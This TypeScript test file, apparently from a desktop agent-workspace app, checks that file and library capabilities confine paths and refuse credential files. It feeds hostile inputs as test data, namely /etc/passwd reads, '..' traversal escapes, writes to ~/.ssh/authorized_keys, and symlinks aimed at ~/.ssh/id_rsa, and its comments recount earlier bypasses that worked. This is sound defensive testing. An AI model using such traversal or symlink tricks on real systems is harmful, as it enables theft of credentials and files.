/**
 * The KILL-SWITCH copy of the path-confined catalog capabilities.
 *
 * READ THIS BEFORE TRUSTING ANY ASSERTION IN THIS FILE AS PRODUCTION COVERAGE.
 *
 * The handlers exercised here — fs.read / fs.write / fs.listEntries /
 * fs.listDir and library.list / library.save / library.remove — register
 * through hubCapabilities.ts's `cat` door, which is a no-op whenever
 * DELEGATE_CATALOG_TO_BRAIN is true. That is the default and the shipping
 * configuration. Main only serves these when the user sets WORKSPACER_NO_BRAIN=1
 * (the escape hatch for a missing/broken packaged brain binary); the rest of the
 * time the answering copy of the guard is services/hub/cmd/brain/fsguard.go.
 *
 * So this file mocks delegation OFF deliberately, and it is the ONLY file
 * allowed to. Its siblings run in the production mode:
 *   - hubCapabilities.test.ts       — main's registerCapability surface;
 *   - hubCapabilitiesGuards.test.ts — the same fixture-driven guard sweep as
 *                                     below, for the methods main owns in
 *                                     production;
 *   - hubCapabilitiesDelegated.test.ts — which door each capability uses.
 *
 * The PREDICATE these cases lean on is not owned here either: it lives in
 * main/lib/pathConfinement.ts and is pinned across all three shipping copies
 * (this one, fsguard.go, internal/bus/policy.go) by the shared fixture
 * contracts/path-containment-cases.json. What this file adds on top is that
 * main's kill-switch handlers actually CALL that predicate, with the right root
 * set, before touching the filesystem.
 *
 * Strategy: mock ./hubClient so registerCapability records handlers into a map
 * we can invoke directly, and mock every collaborator so only the capability
 * bodies run. The mock preamble is a verbatim copy of hubCapabilities.test.ts's;
 * the two files differ only in the ./brainDelegation mock.
 */

import { describe, it, expect, vi, beforeEach, afterEach, afterAll } from 'vitest';
import {
  SweepTally,
  itSweptTheWholeCorpus,
  itRanEveryGatedTest,
  gatedIt,
  CAN_SYMLINK,
} from '../../../tests/support/sweepTally';
import * as os from 'os';
import * as path from 'path';
import * as fs from 'fs';

// Capture every registered capability handler so tests can invoke them directly.
const registered = new Map<string, (params: unknown) => unknown>();
vi.mock('./hubClient', () => ({
  registerCapability: (method: string, handler: (params: unknown) => unknown) => {
    registered.set(method, handler);
  },
}));

// KILL-SWITCH MODE (WORKSPACER_NO_BRAIN=1): delegation OFF, so `cat(...)` is the
// real registerCapability and main's own catalog handlers exist on the bus. This
// is NOT the default configuration — see the header.
vi.mock('./brainDelegation', () => ({ DELEGATE_CATALOG_TO_BRAIN: false }));

const spawnManagedAgent = vi.fn(async () => 'managed-session-id');
vi.mock('./managedSpawn', () => ({
  spawnManagedAgent: (...a: unknown[]) => spawnManagedAgent(...a),
}));

const spawnClaudeAgent = vi.fn(async () => 'claude-session-id');
vi.mock('./claudeSpawn', () => ({ spawnClaudeAgent: (...a: unknown[]) => spawnClaudeAgent(...a) }));

const clientMock = {
  message: vi.fn(async () => ({ ok: true })),
  setPermissionMode: vi.fn(async () => ({ ok: true, mode: 'plan' })),
  setModel: vi.fn(async () => ({ ok: true })),
  handoffBrief: vi.fn(async () => ({ path: '/brief.md' })),
  listProviderModels: vi.fn(async () => ['m1', 'm2']),
  spawn: vi.fn(async () => 'terminal-session-id'),
};
vi.mock('./claudemonSessionClient', () => ({ claudemonSessionClient: clientMock }));

const notePermissionMode = vi.fn();
const getAllSnapshots = vi.fn(() => [] as unknown[]);
vi.mock('./claudeSessionStore', () => ({
  claudeSessionStore: {
    notePermissionMode: (...a: unknown[]) => notePermissionMode(...a),
    getAllSnapshots: (...a: unknown[]) => getAllSnapshots(...a),
    getSnapshot: vi.fn(),
  },
}));

const checkAllProviders = vi.fn(async () => ({ codex: true }));
const resolveAgentBinary = vi.fn(() => '/bin/codex');
vi.mock('./agentProviders', () => ({
  checkAllProviders: (...a: unknown[]) => checkAllProviders(...a),
  checkAllProvidersCached: (...a: unknown[]) => checkAllProviders(...a),
  resolveAgentBinary: (...a: unknown[]) => resolveAgentBinary(...a),
}));

const getConfig = vi.fn(() => ({ agents: { binaries: { codex: '/custom/codex' } } }));
// A real on-disk config dir: the confinement helpers canonicalize through the
// filesystem, and the config-secret deny-list below only means anything if the
// dir it guards actually exists.
const cfg = vi.hoisted(() => {
  const nodeFs = require('fs') as typeof import('fs');
  const nodeOs = require('os') as typeof import('os');
  const nodePath = require('path') as typeof import('path');
  return {
    dir: nodeFs.realpathSync(nodeFs.mkdtempSync(nodePath.join(nodeOs.tmpdir(), 'wks-cap-cfg-'))),
  };
});
const getConfigDirMock = vi.fn(() => cfg.dir);
vi.mock('./configService', () => ({
  configService: {
    getConfig: (...a: unknown[]) => getConfig(...a),
    reloadConfig: vi.fn(),
    getConfigPath: vi.fn(),
    saveConfig: vi.fn(),
  },
  getConfigDir: (...a: unknown[]) => getConfigDirMock(...a),
}));

// Every temp dir a beforeEach/test creates goes through here so the matching
// afterEach can remove it — this suite runs under mutation testing, where a
// leaked dir per test multiplies into hundreds of thousands in /tmp.
const tmpDirs: string[] = [];
const mkTmp = (prefix: string): string => {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)));
  tmpDirs.push(dir);
  return dir;
};
afterEach(() => {
  while (tmpDirs.length) fs.rmSync(tmpDirs.pop()!, { recursive: true, force: true });
});
afterAll(() => {
  fs.rmSync(cfg.dir, { recursive: true, force: true });
});

// Handoff brief authored path — used by claude.handoffAgentBrief.
vi.mock('./agentHandoff', () => ({
  agentHandoffBrief: vi.fn(async () => ({ path: '/agent-brief.md' })),
}));

// The rest are only referenced inside handlers we do not invoke; mock them so
// importing hubCapabilities does not pull in Electron/native plumbing.
// Notification instances record their listeners so a test can fire the click
// handler — that handler is the openExternal sink under test.
const notificationHandlers = new Map<string, (...a: unknown[]) => void>();
const openExternal = vi.fn(async () => {});
vi.mock('electron', () => {
  // A plain function, not an arrow implementation: the capability calls
  // `new Notification(...)`, which an arrow can't service.
  const NotificationMock = vi.fn(function (this: Record<string, unknown>) {
    this.show = vi.fn();
    this.on = (event: string, cb: (...a: unknown[]) => void) => {
      notificationHandlers.set(event, cb);
    };
  });
  (NotificationMock as unknown as { isSupported: () => boolean }).isSupported = () => true;
  return { Notification: NotificationMock, shell: { openExternal } };
});
vi.mock('./claudeProfiles', () => ({ claudeProfiles: {} }));
vi.mock('../lib/appIcon', () => ({ appIconPath: () => undefined }));
vi.mock('./claudeModels', () => ({ listClaudeModels: vi.fn(() => []) }));
const libraryMock = { list: vi.fn(() => []), save: vi.fn(), remove: vi.fn() };
vi.mock('./libraryService', () => ({ libraryService: libraryMock }));
vi.mock('./agentNotifier', () => ({
  agentNotifier: { postInApp: vi.fn(), focusAgent: vi.fn(), focusWindow: vi.fn() },
}));
// sessions.save / layouts.save are BOOT-RESTORE DOCUMENT writers: the desktop's
// next launch respawns their `agents` array through the LOCAL IPC spawn door.
// These two capture what each capability actually hands the persistence layer.
const savedSessions: unknown[] = [];
const savedLayouts: unknown[] = [];
vi.mock('./sessionService', () => ({
  sessionService: {
    saveSession: (doc: unknown) => {
      savedSessions.push(doc);
      return 'saved.yaml';
    },
    // The real one joins each agent's terminal cwd from the pty map; identity
    // here so the test observes exactly the array the capability passed on.
    enrichAgentsWithCwd: (agents: unknown) => agents,
    enrichPanesWithCwd: (panes: unknown) => panes,
  },
}));
vi.mock('./sessionHistory', () => ({ sessionHistory: {} }));
vi.mock('./layoutService', () => ({
  layoutService: {
    save: (doc: unknown) => {
      savedLayouts.push(doc);
      return doc;
    },
  },
}));
vi.mock('./claudeSessionList', () => ({ listClaudeSessionsForDir: vi.fn() }));
const listRecentSessions = vi.fn(async () => [{ sessionId: 's1', provider: 'claude' }]);
vi.mock('./recentSessions', () => ({ listRecentSessions: () => listRecentSessions() }));
vi.mock('./fileService', () => ({
  readTextFile: vi.fn(),
  writeTextFile: vi.fn(),
  listDir: vi.fn(() => ({ path: '', entries: [] })),
}));
vi.mock('./fileWatchService', () => ({ startWatch: vi.fn(), stopWatch: vi.fn() }));
vi.mock('./imagePreview', () => ({ readImagePreview: vi.fn(() => ({ dataUrl: '', bytes: 0 })) }));
vi.mock('./searchService', () => ({
  searchProject: vi.fn(() => ({ results: [], truncated: false })),
}));
// `workRoot` is part of the mock because git.diff's path guard consults it:
// gitService runs every command from the work-tree toplevel, so that — not the
// caller's cwd — is what a `path` is resolved against. Default it to the cwd
// (repo root == agent cwd); the nested-cwd test overrides it.
const workRootFor = vi.fn(async (cwd: string): Promise<string | null> => cwd);
const gitStatus = vi.fn(async () => ({ branch: 'main', files: [] }));
vi.mock('./gitService', () => ({
  status: (cwd: string) => gitStatus(cwd),
  workRoot: (cwd: string) => workRootFor(cwd),
  diff: vi.fn(async () => ''),
  numstat: vi.fn(async () => []),
  stage: vi.fn(async () => ''),
  unstage: vi.fn(async () => ''),
  commit: vi.fn(async () => 'committed'),
  push: vi.fn(async () => 'pushed'),
}));
vi.mock('./terminalShare', () => ({}));
vi.mock('./supervisorSkill', () => ({ ensureSupervisorHome: vi.fn(() => '/home/super') }));

const { registerHubCapabilities } = await import('./hubCapabilities');
const { readTextFile, writeTextFile, listDir } = await import('./fileService');
const { shellConfig } = await import('../lib/shellAllowlist');
const { startWatch, stopWatch } = await import('./fileWatchService');
const { readImagePreview } = await import('./imagePreview');
const { searchProject } = await import('./searchService');

/** Invoke a registered capability by method name. */
function call(method: string, params?: unknown): unknown {
  const handler = registered.get(method);
  if (!handler)
    throw new Error(
      `capability not registered under DELEGATE_CATALOG_TO_BRAIN=false: ${method} — ` +
        `with the kill switch on main registers everything, so a miss here is a ` +
        `renamed or deleted capability, not a delegation split`,
    );
  return handler(params);
}

beforeEach(() => {
  vi.clearAllMocks();
  registered.clear();
  registerHubCapabilities();
});

describe('fs.* path confinement', () => {
  // A real temp dir stands in for a live agent's cwd — the confinement helpers
  // canonicalize via the real filesystem, so the roots must exist.
  let agentCwd: string;
  beforeEach(() => {
    agentCwd = mkTmp('wks-agent-');
    getAllSnapshots.mockReturnValue([{ cwd: agentCwd }] as never);
  });

  it('fs.read allows a path inside a live agent cwd', () => {
    const inside = path.join(agentCwd, 'notes.txt');
    expect(() => call('fs.read', { path: inside })).not.toThrow();
    expect(readTextFile).toHaveBeenCalledWith(inside);
  });

  it('fs.read denies an arbitrary host path (e.g. /etc/passwd)', () => {
    expect(() => call('fs.read', { path: '/etc/passwd' })).toThrow(/outside the allowed workspace/);
    expect(readTextFile).not.toHaveBeenCalled();
  });

  it('fs.read denies a traversal escape from the agent cwd', () => {
    const escape = path.join(agentCwd, '..', '..', '..', 'etc', 'passwd');
    expect(() => call('fs.read', { path: escape })).toThrow(/outside the allowed workspace/);
    expect(readTextFile).not.toHaveBeenCalled();
  });

  it('fs.write denies writing outside the workspace', () => {
    expect(() =>
      call('fs.write', { path: path.join(os.homedir(), '.ssh', 'authorized_keys'), contents: 'x' }),
    ).toThrow(/outside the allowed workspace/);
    expect(writeTextFile).not.toHaveBeenCalled();
  });

  it('fs.write allows a not-yet-existing file inside the agent cwd (nearest-ancestor canonicalize)', () => {
    const newFile = path.join(agentCwd, 'sub', 'new.txt'); // parent dir does not exist yet
    expect(() => call('fs.write', { path: newFile, contents: 'x' })).not.toThrow();
    expect(writeTextFile).toHaveBeenCalledWith(newFile, 'x');
  });

  it('fs.listDir (folder picker) denies browsing outside the home tree', () => {
    expect(() => call('fs.listDir', { path: '/etc' })).toThrow(/outside the allowed workspace/);
  });

  it('fs.listDir allows browsing inside a live agent cwd', () => {
    const res = call('fs.listDir', { path: agentCwd }) as { path: string };
    expect(res.path).toBe(agentCwd);
  });

  // checkUse — the other half of BINDING DECISION 2, which the fixture states
  // and nothing enforced. Every allow-case above hands the service a path that
  // is already its own canonical form (the temp dir is realpath'd), so a handler
  // that went back to re-passing `params.path` satisfied all of them.
  //
  // `<cwd>/nope/../notes.txt` separates the two: the walk appends a component
  // that does not exist and lets the following '..' pop back onto ground that
  // does (the corpus's "'..' after a non-existent component pops lexically and
  // lands inside", an ALLOW case), so the guard returns `<cwd>/notes.txt` —
  // while the raw string is a different string, and the kernel would refuse it
  // with ENOENT because `nope` is not there to walk through.
  describe('the guarded handlers pass the CANONICAL path on, not the caller string', () => {
    const via = (name: string): string => `${path.join(agentCwd, 'nope')}/../${name}`;

    // Every case below is named for the exact `callSites` entry it covers, and
    // the set is compared against the fixture at the end of the block. checkUse
    // used to be read only for the presence of this owner's KEY — never the
    // requirement text and never the call-site list — so a hand-maintained table
    // that covered eight of ten entries looked complete.
    //
    // Marked from INSIDE the body, beside the assertions, not beside `it`. The
    // Go twin (fsguard_test.go's `run` helper) says why verbatim: "Marking it
    // here, beside t.Run, records what was REGISTERED — so a subtest that
    // skipped, or one whose body was emptied, would still report its call site
    // as covered and the comparison against the fixture's checkUse list at the
    // bottom would still agree." This copy marked at registration, which is
    // exactly that lie: emptying the body of `fs.read -> readTextFile` kept the
    // set equal to the fixture, and fs.read could then go back to opening the
    // caller's unresolved string with 88 files / 1379 tests green.
    const covered = new Set<string>();
    const site = (name: string, fn: () => void | Promise<void>): void => {
      it(name, async () => {
        // hasAssertions(), because "the body ran" is not the same claim as "the
        // body proved something": an EMPTIED body still reaches the line below
        // and still reports its call site as covered.
        expect.hasAssertions();
        await fn();
        covered.add(name);
      });
    };

    site('fs.read -> readTextFile', () => {
      call('fs.read', { path: via('notes.txt') });
      expect(readTextFile).toHaveBeenCalledWith(path.join(agentCwd, 'notes.txt'));
    });

    site('fs.write -> writeTextFile', () => {
      call('fs.write', { path: via('out.txt'), contents: 'x' });
      expect(writeTextFile).toHaveBeenCalledWith(path.join(agentCwd, 'out.txt'), 'x');
    });

    site('fs.listEntries -> listDir', () => {
      call('fs.listEntries', { path: `${path.join(agentCwd, 'nope')}/..` });
      expect(listDir).toHaveBeenCalledWith(agentCwd);
    });

    site('fs.listDir -> readdirSync', () => {
      const res = call('fs.listDir', { path: `${path.join(agentCwd, 'nope')}/..` }) as {
        path: string;
      };
      expect(res.path).toBe(agentCwd);
    });

    site('search.project -> searchProject', () => {
      call('search.project', { cwd: `${path.join(agentCwd, 'nope')}/..`, query: 'needle' });
      expect(searchProject).toHaveBeenCalledWith(
        expect.objectContaining({ cwd: agentCwd, query: 'needle' }),
      );
    });

    // The three capabilities the DESKTOP is the only provider of. The corpus's
    // checkUse block names them among pathConfinement.ts's ten call sites, and
    // this describe covered five — so for exactly the three with no Go twin to
    // fall back on, nothing asserted which string reached the service. That is
    // not cosmetic: startWatch/stopWatch still run `path.resolve(filePath)` on
    // whatever they are handed — a second, whole-path opinion of the same kind
    // that shipped as the brain's trailing-space escape — so re-passing the raw
    // param re-creates a check-path/opened-path split rather than merely an
    // untested one.
    site('fs.readImage -> readImagePreview', () => {
      call('fs.readImage', { path: via('shot.png') });
      expect(readImagePreview).toHaveBeenCalledWith(path.join(agentCwd, 'shot.png'));
    });

    site('fs.watch -> startWatch', () => {
      call('fs.watch', { path: via('watched.txt') });
      expect(vi.mocked(startWatch).mock.calls[0]![0]).toBe(path.join(agentCwd, 'watched.txt'));
    });

    site('fs.unwatch -> stopWatch', () => {
      call('fs.unwatch', { path: via('watched.txt') });
      expect(vi.mocked(stopWatch).mock.calls[0]![0]).toBe(path.join(agentCwd, 'watched.txt'));
    });

    // The last two entries in the owner's list, which nothing reached. Both
    // handlers guard a `cwd` and then hand it to a service that composes many
    // more paths out of it, so re-passing the caller's string here is the widest
    // version of the split.
    site('library.list/save/remove -> libraryService', () => {
      const canonical = agentCwd;
      call('library.list', { cwd: `${path.join(agentCwd, 'nope')}/..` });
      expect(libraryMock.list.mock.calls[0]![0]).toBe(canonical);
      call('library.save', {
        scope: 'project',
        cwd: `${path.join(agentCwd, 'nope')}/..`,
        title: 't',
        kind: 'prompt',
        body: 'b',
      });
      expect((libraryMock.save.mock.calls[0]![0] as { cwd: string }).cwd).toBe(canonical);
      call('library.remove', {
        scope: 'project',
        id: 'x',
        cwd: `${path.join(agentCwd, 'nope')}/..`,
      });
      expect(libraryMock.remove.mock.calls[0]![2]).toBe(canonical);
    });

    site('git.* -> gitService', async () => {
      await call('git.status', { cwd: `${path.join(agentCwd, 'nope')}/..` });
      expect(gitStatus.mock.calls[0]![0]).toBe(agentCwd);
    });

    it('covers exactly the call sites the fixture names for this owner', () => {
      const entry = fixture.checkUse.find(
        (e: { owner: string }) => e.owner === 'apps/desktop/src/main/lib/pathConfinement.ts',
      );
      expect(
        entry?.callSites?.length,
        'the fixture must record this owner call sites',
      ).toBeTruthy();
      expect([...covered].sort()).toEqual([...(entry!.callSites as string[])].sort());
    });
  });
});

describe('fs.* credential deny-list (twin of the brain fsguard)', () => {
  // The config dir used to be a workspace root wholesale, which handed any bus
  // caller remote-token / tokens.json / every plugin's .bus-token — i.e. the
  // credential that makes a connection `trusted`, which drops per-plugin scoping
  // and unlocks /plugins/install. Only library/, layouts/ and sessions/ are roots
  // now, and the deny still applies however the path got admitted.
  //
  // Every case below runs with an agent cwd that CONTAINS the config dir (the
  // user who spawned an agent in ~/.config), so the roots check passes and only
  // the deny-list can refuse — testing the gate that actually has to hold.
  let agentCwd: string;
  beforeEach(() => {
    fs.mkdirSync(path.join(cfg.dir, 'library'), { recursive: true });
    fs.mkdirSync(path.join(cfg.dir, 'plugins', 'acme.ci'), { recursive: true });
    fs.writeFileSync(path.join(cfg.dir, 'remote-token'), 'super-secret', 'utf-8');
    fs.writeFileSync(path.join(cfg.dir, 'plugins', 'acme.ci', '.bus-token'), 'tok', 'utf-8');
    agentCwd = path.dirname(cfg.dir);
    getAllSnapshots.mockReturnValue([{ cwd: agentCwd }] as never);
  });

  it('fs.read denies the remote-share token', () => {
    expect(() => call('fs.read', { path: path.join(cfg.dir, 'remote-token') })).toThrow(
      /outside the allowed workspace/,
    );
    expect(readTextFile).not.toHaveBeenCalled();
  });

  it("fs.read denies a plugin's .bus-token", () => {
    expect(() =>
      call('fs.read', { path: path.join(cfg.dir, 'plugins', 'acme.ci', '.bus-token') }),
    ).toThrow(/outside the allowed workspace/);
    expect(readTextFile).not.toHaveBeenCalled();
  });

  it('fs.write denies overwriting a credential (a token DoS is a bus outage)', () => {
    expect(() =>
      call('fs.write', { path: path.join(cfg.dir, 'remote-token'), contents: 'x' }),
    ).toThrow(/outside the allowed workspace/);
    expect(writeTextFile).not.toHaveBeenCalled();
  });

  it('denies .bus-token / .settings.json by basename anywhere, not just in the config dir', () => {
    // `workspacer plugin dev <dir>` mints these inside an ordinary project, which
    // is an agent cwd — a root no narrowing can help with.
    const devPlugin = fs.mkdtempSync(path.join(agentCwd, 'wks-devplugin-'));
    for (const name of ['.bus-token', '.settings.json']) {
      expect(() => call('fs.read', { path: path.join(devPlugin, name) })).toThrow(
        /outside the allowed workspace/,
      );
    }
    expect(readTextFile).not.toHaveBeenCalled();
    fs.rmSync(devPlugin, { recursive: true, force: true });
  });

  it('still allows the library/ subtree the UI edits', () => {
    const item = path.join(cfg.dir, 'library', 'prompt.md');
    expect(() => call('fs.read', { path: item })).not.toThrow();
    expect(readTextFile).toHaveBeenCalledWith(item);
  });

  it('denies the config secret on the roots check too when no agent cwd covers it', () => {
    getAllSnapshots.mockReturnValue([] as never);
    expect(() => call('fs.read', { path: path.join(cfg.dir, 'remote-token') })).toThrow(
      /outside the allowed workspace/,
    );
    expect(readTextFile).not.toHaveBeenCalled();
  });
});

/**
 * The per-file guard a library.* handler hands the service, found by TYPE rather
 * than by position.
 *
 * It used to be `.at(-1)`, which quietly stopped meaning "the guard" the moment
 * library.list grew a trailing filter argument — the assertion then read
 * `typeof {} === 'function'` and failed for a reason that had nothing to do with
 * confinement. Requiring EXACTLY ONE function argument keeps it honest in the
 * other direction too: a handler that started passing a second callback would
 * fail here instead of silently probing the wrong one.
 */
function guardArgOf(args: unknown[]): (p: string) => string | null {
  const fns = args.filter((a) => typeof a === 'function');
  expect(fns, 'exactly one argument should be the per-file guard').toHaveLength(1);
  return fns[0] as (p: string) => string | null;
}

describe('library.* cwd confinement', () => {
  // `cwd` selects the project whose .workspacer/library + .claude assets are
  // listed, written and (recursively) deleted — untrusted on the bus.
  let agentCwd: string;
  beforeEach(() => {
    agentCwd = mkTmp('wks-lib-');
    getAllSnapshots.mockReturnValue([{ cwd: agentCwd }] as never);
  });

  // $HOME relocations made by withFakeHome below, undone after each test.
  const homeRestores: Array<() => void> = [];
  afterEach(() => {
    while (homeRestores.length) homeRestores.pop()!();
  });

  it('library.save is denied for a cwd outside the workspace', () => {
    expect(() =>
      call('library.save', {
        scope: 'project',
        cwd: os.homedir(),
        title: 't',
        kind: 'prompt',
        body: 'b',
      }),
    ).toThrow(/outside the allowed workspace/);
    expect(libraryMock.save).not.toHaveBeenCalled();
  });

  it('library.save runs for a live agent cwd', () => {
    call('library.save', {
      scope: 'project',
      cwd: agentCwd,
      title: 't',
      kind: 'prompt',
      body: 'b',
    });
    expect(libraryMock.save).toHaveBeenCalledTimes(1);
  });

  it('library.save hands the service a per-file guard that confines the DESTINATION', () => {
    // The cwd check is not the write check: the destination
    // (<cwd>/.workspacer/library/<slug>.md, <cwd>/.claude/skills/<id>/SKILL.md)
    // is composed after it and handed to writeFileSync, which follows a symlink
    // planted there by an ordinary permitted fs.write. list and remove got this
    // guard and save did not, so the desktop overwrote <configDir>/config.yaml
    // through a call the Go brain refuses. (libraryService.save's own end of the
    // contract — that it uses this guard, before mkdir, on the path it opens —
    // is pinned in libraryService.test.ts.)
    call('library.save', {
      scope: 'project',
      cwd: agentCwd,
      title: 't',
      kind: 'prompt',
      body: 'b',
    });
    const guard = libraryMock.save.mock.calls[0][1] as (p: string) => string | null;
    expect(typeof guard).toBe('function');
    expect(guard(path.join(agentCwd, '.workspacer', 'library', 'ok.md'))).toBe(
      path.join(agentCwd, '.workspacer', 'library', 'ok.md'),
    );
    expect(guard(path.join(cfg.dir, 'config.yaml'))).toBeNull();
    expect(guard(path.join(cfg.dir, 'remote-token'))).toBeNull();
  });

  it('library.remove is denied for a cwd outside the workspace', () => {
    expect(() =>
      call('library.remove', { scope: 'claude', id: 'x', cwd: '/etc', kind: 'skill' }),
    ).toThrow(/outside the allowed workspace/);
    expect(libraryMock.remove).not.toHaveBeenCalled();
  });

  it('library.list is denied for a cwd outside the browsable tree', () => {
    expect(() => call('library.list', { cwd: '/etc' })).toThrow(/outside the allowed workspace/);
    expect(libraryMock.list).not.toHaveBeenCalled();
  });

  it('library.list allows a directory under home that is not an agent cwd yet', () => {
    // The New Agent dialog lists the library of the directory the user is about
    // to spawn in, to populate the project-MCP picker — no agent runs there yet,
    // and the dialog swallows errors, so a workspace-roots rule here would show
    // an empty picker rather than an error. Same browse rule as fs.listDir.
    const notYetSpawned = path.join(os.homedir(), 'some-project');
    call('library.list', { cwd: notYetSpawned });
    expect(libraryMock.list).toHaveBeenCalledWith(notYetSpawned, expect.any(Function), {
      kind: undefined,
      id: undefined,
    });
  });

  // Confining the cwd is not the same thing as confining what the service then
  // touches: every read and unlink is a path DERIVED from that cwd
  // (<cwd>/.workspacer/library/<name>.md, <cwd>/.claude/skills/<id>), composed
  // after the check. Unguarded, a symlink planted in the allowed project — an
  // ordinary permitted fs.write — read remote-token through library.list and
  // rm -rf'd the config dir through library.remove. So the handler passes a
  // per-file guard, and these assert the guard it passed actually confines.
  it('library.list hands the service a per-file guard that confines derived paths', () => {
    call('library.list', { cwd: agentCwd });
    const guard = libraryMock.list.mock.calls[0][1] as (p: string) => string | null;
    expect(guard(path.join(agentCwd, '.workspacer', 'library', 'ok.md'))).toBe(
      path.join(agentCwd, '.workspacer', 'library', 'ok.md'),
    );
    expect(guard(path.join(cfg.dir, 'remote-token'))).toBeNull();
    expect(guard(path.join(os.tmpdir(), 'somewhere-else', 'x.md'))).toBeNull();
    // …and the guard's roots are NOT the cwd's roots. library.list checks its
    // cwd against the browse roots (workspace + the whole home tree) because the
    // New Agent dialog lists a directory no agent runs in yet — handing those
    // same roots to the per-file guard made this call an arbitrary
    // home-directory READER: `<cwd>/.workspacer/library/a.md -> ~/.ssh/id_rsa`
    // canonicalizes inside $HOME, passes, and comes back as an item body, while
    // fs.read of the identical path is refused. A library item lives in the
    // project or in the global store, and nowhere else.
    //
    // Written against $HOME rather than a temp path on purpose: the assertion
    // above only holds because os.tmpdir() happens to sit outside the home tree,
    // so it inverts under TMPDIR=~/tmp and proved nothing about this widening.
    expect(guard(path.join(os.homedir(), '.ssh', 'id_rsa'))).toBeNull();
    expect(guard(path.join(os.homedir(), '.claude', '.credentials.json'))).toBeNull();
    // The global store stays readable: it is the other place items live.
    expect(guard(path.join(cfg.dir, 'library', 'shared.md'))).toBe(
      path.join(cfg.dir, 'library', 'shared.md'),
    );
  });

  it('library.remove hands the service a per-file guard that confines delete targets', () => {
    call('library.remove', { scope: 'claude', id: 'x', cwd: agentCwd, kind: 'skill' });
    // remove(scope, id, cwd, kind, origin, guard) — the guard is last, like
    // list()/save(), so read it off the end rather than by a fixed index.
    const guard = guardArgOf(libraryMock.remove.mock.calls[0]);
    expect(guard(path.join(agentCwd, '.claude', 'skills', 'x'))).toBe(
      path.join(agentCwd, '.claude', 'skills', 'x'),
    );
    expect(guard(path.join(cfg.dir, 'remote-token'))).toBeNull();
    expect(guard(path.join(cfg.dir, 'config.yaml'))).toBeNull();
  });

  // The per-file guard's ANSWER, which every assertion above leaves free.
  //
  // They all call `guard(x)` on symlink-free paths and expect `x` back, so
  // `assertPathAllowed(cap, filePath, roots); return filePath;` — the guard
  // deciding correctly and then handing back the CALLER-DERIVED string — passed
  // 188/188 focused and the whole 86-file main suite. `path.resolve(filePath)`
  // passed too. This is BINDING DECISION 2 at the one factory that supplies the
  // guard libraryService uses for every readFileSync / writeFileSync /
  // mkdirSync / fs.watch / unlinkSync / rmSync of a DERIVED library path, and
  // the module header says "every caller must hand the RETURNED canonical path
  // to the filesystem".
  //
  // Only a symlink separates the two strings: an alias and its target are both
  // legal, both inside the item roots, and they name different files. os.unlink
  // and fs.watch do not follow the final link while the guard does, so which
  // string comes back decides which file is opened.
  //
  // TWIN: the three `(per-file guard)` subtests of
  // TestGuardedHandlersOpenTheCanonicalPathTheyValidated in
  // services/hub/cmd/brain/fsguard_test.go.
  const perFileGate = { ran: 0 };
  const itLinks = gatedIt(CAN_SYMLINK, perFileGate);

  for (const leg of [
    { method: 'library.list', params: {} },
    { method: 'library.remove', params: { scope: 'claude', id: 'x', kind: 'skill' } },
    {
      method: 'library.save',
      params: { scope: 'project', title: 't', kind: 'prompt', body: 'b' },
    },
  ]) {
    itLinks(`${leg.method}'s per-file guard returns the RESOLVED path, not the caller's`, () => {
      const itemDir = path.join(agentCwd, '.workspacer', 'library');
      fs.mkdirSync(itemDir, { recursive: true });
      const target = path.join(itemDir, 'target.md');
      const alias = path.join(itemDir, 'alias.md');
      fs.writeFileSync(target, '---\ntitle: T\n---\n\nb\n', 'utf-8');
      fs.symlinkSync(target, alias);

      call(leg.method, { ...leg.params, cwd: agentCwd });
      const mock = (libraryMock as unknown as Record<string, { mock: { calls: unknown[][] } }>)[
        leg.method.split('.')[1]
      ];
      const guard = guardArgOf(mock.mock.calls[0]);
      expect(typeof guard).toBe('function');
      expect(
        guard(alias),
        'the guard must hand back the file it validated, not the link the caller named',
      ).toBe(target);
    });
  }

  itRanEveryGatedTest(perFileGate, "the per-file guard's canonical-answer tests", 3);

  // ── The ITEM-DIRECTORY half of the derived-path gate ────────────────────
  //
  // Confining the cwd and confining the DERIVED path are two checks, and this
  // file already asserts the second one exists. What it did not assert is how
  // WIDE it is: `libraryItemRoots(canonicalCwd)` is `[<configDir>/library,
  // canonicalCwd]`, and library.list checks its cwd against the BROWSE roots —
  // so a caller may name $HOME itself, and then "the project the caller named"
  // is the whole home tree and the narrowing evaporates. A
  // `$HOME/.workspacer/library/a.md -> $HOME/.ssh/id_rsa` symlink canonicalizes
  // inside that root, passes, and comes back as an item BODY, while fs.read of
  // the identical path is refused for the same caller.
  //
  // The brain has refused exactly this since library.* became bus-reachable
  // (libraryItemDirs + containsPath in cmd/brain/library.go, pinned by
  // TestLibraryItemDirsRefuseEveryShapeOfTheComparison). This copy had only the
  // roots, so the two providers disagreed about the same call — and this is the
  // copy the kill switch puts back on the bus.
  //
  // Each case below is the shape of one surviving mutation of the two lines the
  // fix adds, and is the TWIN of the Go case with the same name.
  //
  // BOTH HALVES ARE ASSERTED, because they are different claims: the guard must
  // REFUSE, and the call must not carry the planted bytes back. A guard that
  // returns the path while libraryService happens not to read it satisfies
  // neither, and a guard that throws while the body still reaches the caller
  // satisfies only the first.
  const itemDirGate = { ran: 0 };
  const itItemDirs = gatedIt(CAN_SYMLINK, itemDirGate);
  const PLANTED_SECRET = 'SWEEP-PLANTED-ITEM-DIR-SECRET';

  /** Relocate $HOME for one test (browseRoots reads os.homedir(), which honours
   *  it) so the cwd a case names is the widest one library.list accepts without
   *  writing anything into the developer's real home. */
  const withFakeHome = (): string => {
    const home = mkTmp('wks-lib-home-');
    const prev = process.env.HOME;
    const prevProfile = process.env.USERPROFILE;
    process.env.HOME = home;
    process.env.USERPROFILE = home;
    homeRestores.push(() => {
      if (prev === undefined) delete process.env.HOME;
      else process.env.HOME = prev;
      if (prevProfile === undefined) delete process.env.USERPROFILE;
      else process.env.USERPROFILE = prevProfile;
    });
    return home;
  };

  const link = (target: string, alias: string): void => {
    fs.mkdirSync(path.dirname(alias), { recursive: true });
    fs.symlinkSync(target, alias);
  };

  for (const tc of [
    {
      name: 'an item directory is compared lexically, never resolved',
      why:
        'canonicalizing the project item dirs resolves the very link the gate exists to see, ' +
        'so the derived file lands "inside" a library directory that is really ~/.ssh',
      plant: (home: string): string => {
        fs.mkdirSync(path.join(home, '.ssh'), { recursive: true });
        fs.writeFileSync(path.join(home, '.ssh', 'id_rsa.md'), PLANTED_SECRET, 'utf-8');
        link(path.join(home, '.ssh'), path.join(home, '.workspacer', 'library'));
        return path.join(home, '.workspacer', 'library', 'id_rsa.md');
      },
    },
    {
